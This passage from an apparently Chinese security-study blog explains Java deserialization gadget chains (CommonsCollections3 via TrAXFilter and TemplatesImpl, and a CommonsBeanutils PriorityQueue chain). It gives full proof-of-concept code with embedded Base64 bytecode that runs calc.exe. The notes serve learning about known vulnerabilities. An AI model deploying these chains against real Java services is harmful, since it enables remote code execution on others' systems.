class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>哈哈哈先水一下ROME，待会在来~~吃饭去了。</p>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollection3</title>
    <link href="/2022/03/05/CommonCollection3/"/>
    <url>/2022/03/05/CommonCollection3/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>为什么有cc3，其实是cc1的<strong>InvokerTransformer</strong>被禁用了（无法被反序列化）。<br>那么这里cc3出现了<strong>TrAXFilter</strong></p><h2 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051051149.png" alt="QQ截图20220305105118"></p><p>这里就直接在其构造方法中使用了<strong>newTransformer()<strong>。一直跟进</strong>newTransformer（）</strong>会来到。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051203589.png" alt="QQ截图20220305110525"></p><p>后续利用不久是<strong>TemplatesImpl</strong>了吗？</p><p>那么如何利用这个类呢？</p><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051101285.png" alt="QQ截图20220305110121"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051203909.png" alt="QQ截图20220305110137"></p><p>在该类中的**transform()**里使用反射直接创建出一个实例。</p><p>那么这不就是可以直接不利用InvokerTransformer了？</p><h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = &#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>       &#125;;<br></code></pre></td></tr></table></figure><p>这里的功能相当于是实现了返回<strong>TrAXFilter</strong>类，然后通过 <strong>InstantiateTransformer</strong>实例化<strong>TrAXFilter</strong>类，然后就会调用其构造方法。从而调用**newTransformer()**。接着就是cc1的内容了。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc3Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, mapProxy);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>     <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>     objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections3（TemplatesImpl）</title>
    <link href="/2022/03/04/CommonsCollections3%EF%BC%88TemplatesImpl%EF%BC%89/"/>
    <url>/2022/03/04/CommonsCollections3%EF%BC%88TemplatesImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3（TemplatesImpl）"><a href="#CommonsCollections3（TemplatesImpl）" class="headerlink" title="CommonsCollections3（TemplatesImpl）"></a>CommonsCollections3（TemplatesImpl）</h1><p>ysoserial用cc2是这种办法。这里就将就一下，用cc3来完成这个效果。本质上木有区别。想当于是<strong>TemplatesImpl+cc1的后半段</strong>。感觉会了，就不继续复习了。<strong>（这里还是利用了InvokerTransformer）</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc3Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getOutputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>])<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap= TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span 